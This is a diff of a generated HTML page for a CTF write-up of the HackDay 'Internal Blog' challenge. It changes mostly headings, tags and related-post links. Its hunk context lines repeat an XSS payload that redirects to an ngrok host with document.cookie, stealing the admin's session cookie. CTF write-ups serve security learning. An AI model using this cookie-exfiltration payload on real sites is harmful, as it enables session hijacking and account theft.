@@ -1120,6 +1120,11 @@
   
 
   
+
+  
+  
+
+  
     
     
 
@@ -1195,11 +1200,6 @@
     
 
     
-  
-
-  
-  
-
   
 
   
@@ -1335,7 +1335,7 @@
   class="readtime"
   data-bs-toggle="tooltip"
   data-bs-placement="bottom"
-  title="478 words"
+  title="473 words"
 >
   <em>2 min</em> read</span>
 
@@ -1393,11 +1393,11 @@
 
 <h1 id="introduction">Introduction</h1>
 
-<h2 id="hackday"><span class="me-2">HackDay</span><a href="#hackday" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<h3 id="hackday"><span class="me-2">HackDay</span><a href="#hackday" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
 
-<p><a href="https://ctftime.org/team/368433">We</a> finished <strong>39</strong> on <strong>150</strong>. <a href="https://ctftime.org/event/2615"> Link to the event </a></p>
+<p><a href="https://ctftime.org/event/2615"> Link to the event </a></p>
 
-<h2 id="description"><span class="me-2">Description</span><a href="#description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<h3 id="description"><span class="me-2">Description</span><a href="#description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
 
 <blockquote>
   <p>You’ve received an anonymous tip from the Airship Mail Delivery Company claiming that a seemingly legitimate website is actually a front for trading stolen submarine mechanical parts. Yeah, that’s oddly specific…
@@ -1409,7 +1409,7 @@ The localhost port is 3000. Take a closer look and see if you can uncover anythi
 
 <h1 id="enumeration">Enumeration</h1>
 
-<h2 id="enumerating-website"><span class="me-2">Enumerating website</span><a href="#enumerating-website" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<h3 id="enumerating-website"><span class="me-2">Enumerating website</span><a href="#enumerating-website" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
 <p>Let’s start by accessing the index page:
 <a href="/assets/img/writeups/InternalBlog/index.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/InternalBlog/index.png" alt="index"  loading="lazy"></a>
 <em>Admin visits every posts</em></p>
@@ -1430,7 +1430,7 @@ The localhost port is 3000. Take a closer look and see if you can uncover anythi
 
 <h1 id="exploitation">Exploitation</h1>
 
-<h2 id="popping-alert"><span class="me-2">Popping alert</span><a href="#popping-alert" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<h3 id="popping-alert"><span class="me-2">Popping alert</span><a href="#popping-alert" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
 
 <p><a href="/assets/img/writeups/InternalBlog/signup.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/InternalBlog/signup.png" alt="index"  loading="lazy"></a>
 <em>Signup page</em></p>
@@ -1502,7 +1502,7 @@ The localhost port is 3000. Take a closer look and see if you can uncover anythi
 <em>XSS !!!</em></li>
 </ul>
 
-<h2 id="stealing-admin-cookie"><span class="me-2">Stealing admin cookie</span><a href="#stealing-admin-cookie" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<h3 id="stealing-admin-cookie"><span class="me-2">Stealing admin cookie</span><a href="#stealing-admin-cookie" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
 
 <p>To steal the admin cookie, we have to:</p>
 
@@ -1539,7 +1539,7 @@ window.location.href = `http://2.tcp.eu.ngrok:12812/?cookie=` + document.cookie
 <p>We can see our post below on the index page:
 <a href="/assets/img/writeups/InternalBlog/we_see_out_post.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/InternalBlog/we_see_out_post.png" alt="index"  loading="lazy"></a></p>
 
-<h2 id="getting-flag"><span class="me-2">Getting flag</span><a href="#getting-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<h3 id="getting-flag"><span class="me-2">Getting flag</span><a href="#getting-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
 <p>After a few minutes:
 <a href="/assets/img/writeups/InternalBlog/flag.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/InternalBlog/flag.png" alt="index"  loading="lazy"></a></p>
 
@@ -1587,6 +1587,11 @@ window.location.href = `http://2.tcp.eu.ngrok:12812/?cookie=` + document.cookie
             href="/tags/javascript/"
             class="post-tag no-text-decoration"
           >javascript</a>
+        
+          <a
+            href="/tags/python/"
+            class="post-tag no-text-decoration"
+          >python</a>
         
       </div>
     
@@ -1698,14 +1703,14 @@ window.location.href = `http://2.tcp.eu.ngrok:12812/?cookie=` + document.cookie
         
         
         <li class="text-truncate lh-lg">
-          <a href="/posts/knightctf-2025-baby-injection/">KnightCTF - Baby Injection</a>
+          <a href="/posts/hackday-2025-website-checker/">HackDay - Verificator 3000</a>
         </li>
       
         
         
         
         <li class="text-truncate lh-lg">
-          <a href="/posts/knightctf-2025-luana/">KnightCTF - Luana</a>
+          <a href="/posts/knightctf-2025-baby-injection/">KnightCTF - Baby Injection</a>
         </li>
       
         
@@ -1719,7 +1724,7 @@ window.location.href = `http://2.tcp.eu.ngrok:12812/?cookie=` + document.cookie
         
         
         <li class="text-truncate lh-lg">
-          <a href="/posts/poctf-2025/">Pointer Overflow CTF</a>
+          <a href="/posts/poctf-2025/">PoCTF - Drained</a>
         </li>
       
     </ul>
@@ -2176,6 +2181,125 @@ window.location.href = `http://2.tcp.eu.ngrok:12812/?cookie=` + document.cookie
     
     
     
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
   
     
     
@@ -2305,6 +2429,8 @@ window.location.href = `http://2.tcp.eu.ngrok:12812/?cookie=` + document.cookie
     
     
     
+      
+    
   
     
     
@@ -2434,141 +2560,10 @@ window.location.href = `http://2.tcp.eu.ngrok:12812/?cookie=` + document.cookie
     
     
     
-  
-    
-    
-    
-    
       
         
         
 
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
   
     
     
@@ -2613,11 +2608,6 @@ window.location.href = `http://2.tcp.eu.ngrok:12812/?cookie=` + document.cookie
     
     
     
-  
-    
-    
-    
-    
       
     
   
@@ -2709,8 +2699,6 @@ window.location.href = `http://2.tcp.eu.ngrok:12812/?cookie=` + document.cookie
     
     
     
-    
-      
     
   
     
@@ -2762,6 +2750,9 @@ window.location.href = `http://2.tcp.eu.ngrok:12812/?cookie=` + document.cookie
         <a class="post-tag btn btn-outline-primary" href="/tags/hacking-tools/">hacking-tools</a>
       
         
+        <a class="post-tag btn btn-outline-primary" href="/tags/python/">python</a>
+      
+        
         <a class="post-tag btn btn-outline-primary" href="/tags/tryhackme/">tryhackme</a>
       
         
@@ -2772,9 +2763,6 @@ window.location.href = `http://2.tcp.eu.ngrok:12812/?cookie=` + document.cookie
       
         
         <a class="post-tag btn btn-outline-primary" href="/tags/pwncat/">pwncat</a>
-      
-        
-        <a class="post-tag btn btn-outline-primary" href="/tags/python/">python</a>
       
         
         <a class="post-tag btn btn-outline-primary" href="/tags/active-directory/">active-directory</a>
@@ -2936,19 +2924,19 @@ window.location.href = `http://2.tcp.eu.ngrok:12812/?cookie=` + document.cookie
   
 
   
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
     
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
 
 
 
@@ -2964,7 +2952,7 @@ window.location.href = `http://2.tcp.eu.ngrok:12812/?cookie=` + document.cookie
     <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
       
         <article class="col">
-          <a href="/posts/knightctf-2025-luana/" class="post-preview card h-100">
+          <a href="/posts/hackday-2025-website-checker/" class="post-preview card h-100">
             <div class="card-body">
               <!--
   Date format snippet
@@ -2976,71 +2964,18 @@ window.location.href = `http://2.tcp.eu.ngrok:12812/?cookie=` + document.cookie
 
 <time
   
-  data-ts="1737388800"
+  data-ts="1737892800"
   data-df="ll"
   
 >
-  Jan 20, 2025
+  Jan 26, 2025
 </time>
 
-              <h4 class="pt-0 my-2">KnightCTF - Luana</h4>
+              <h4 class="pt-0 my-2">HackDay - Verificator 3000</h4>
               <div class="text-muted">
                 <p>Introduction
     
-      Knight CTF
-    
-  
-  Enumeration
-    
-      Index page
-      Redis
-    
-  
-  Exploitation
-    
-      Getting RCE
-      Getting flag
-    
-  
-
-
-
-
-Introduction
-
-KnightCTF
-
-Knig...</p>
-              </div>
-            </div>
-          </a>
-        </article>
-      
-        <article class="col">
-          <a href="/posts/knightctf-2025-baby-injection/" class="post-preview card h-100">
-            <div class="card-body">
-              <!--
-  Date format snippet
-  See: ${JS_ROOT}/utils/locale-dateime.js
--->
-
-
-
-
-<time
-  
-  data-ts="1737388800"
-  data-df="ll"
-  
->
-  Jan 20, 2025
-</time>
-
-              <h4 class="pt-0 my-2">KnightCTF - Baby Injection</h4>
-              <div class="text-muted">
-                <p>Introduction
-    
-      KnightCTF
+      Description
     
   
   Enumeration
@@ -3050,26 +2985,17 @@ Knig...</p>
   
   Exploitation
     
-      Getting RCE
-      Getting flag
-    
-  
-
-
-
-
-Introduction
-
-KnightCTF
-
-We’ve fi...</p>
+      SSRF
+        
+          Trying to access localhost
+          Exploiting Op...</p>
               </div>
             </div>
           </a>
         </article>
       
         <article class="col">
-          <a href="/posts/poctf-2025/" class="post-preview card h-100">
+          <a href="/posts/SrdnlenCTF2025-racecondition/" class="post-preview card h-100">
             <div class="card-body">
               <!--
   Date format snippet
@@ -3088,9 +3014,65 @@ We’ve fi...</p>
   Jan 18, 2025
 </time>
 
-              <h4 class="pt-0 my-2">Pointer Overflow CTF</h4>
+              <h4 class="pt-0 my-2">Srdnlen CTF - Speed</h4>
               <div class="text-muted">
-                <p>The Color Drained from His Face</p>
+                <p>Introduction
+    
+      Srdnlen CTF 2025
+    
+  
+  Source Code
+    
+      Reading source code
+      Interesting points
+      Identifying vulnerabilities
+    
+  
+  Exploitation
+    
+      Exploiting...</p>
+              </div>
+            </div>
+          </a>
+        </article>
+      
+        <article class="col">
+          <a href="/posts/uoftctf2025-prismatic/" class="post-preview card h-100">
+            <div class="card-body">
+              <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1736611200"
+  data-df="ll"
+  
+>
+  Jan 11, 2025
+</time>
+
+              <h4 class="pt-0 my-2">UofTCTF - Prismatic Blogs</h4>
+              <div class="text-muted">
+                <p>Introduction
+    
+      UofTCTF 2025
+    
+  
+  Source Code
+    
+      Reading source code
+      Interesting points
+      Identifying vulnerabilities
+    
+  
+  Exploitation
+    
+      Exploiting the...</p>
               </div>
             </div>
           </a>
@@ -3596,6 +3578,125 @@ We’ve fi...</p>
     
     
     
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
   
     
     
@@ -3725,6 +3826,8 @@ We’ve fi...</p>
     
     
     
+      
+    
   
     
     
@@ -3854,141 +3957,10 @@ We’ve fi...</p>
     
     
     
-  
-    
-    
-    
-    
       
         
         
 
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
   
     
     
@@ -4033,11 +4005,6 @@ We’ve fi...</p>
     
     
     
-  
-    
-    
-    
-    
       
     
   
@@ -4129,8 +4096,6 @@ We’ve fi...</p>
     
     
     
-    
-      
     
   
     
@@ -4182,6 +4147,9 @@ We’ve fi...</p>
         <a class="post-tag btn btn-outline-primary" href="/tags/hacking-tools/">hacking-tools</a>
       
         
+        <a class="post-tag btn btn-outline-primary" href="/tags/python/">python</a>
+      
+        
         <a class="post-tag btn btn-outline-primary" href="/tags/tryhackme/">tryhackme</a>
       
         
@@ -4192,9 +4160,6 @@ We’ve fi...</p>
       
         
         <a class="post-tag btn btn-outline-primary" href="/tags/pwncat/">pwncat</a>
-      
-        
-        <a class="post-tag btn btn-outline-primary" href="/tags/python/">python</a>
       
         
         <a class="post-tag btn btn-outline-primary" href="/tags/active-directory/">active-directory</a>
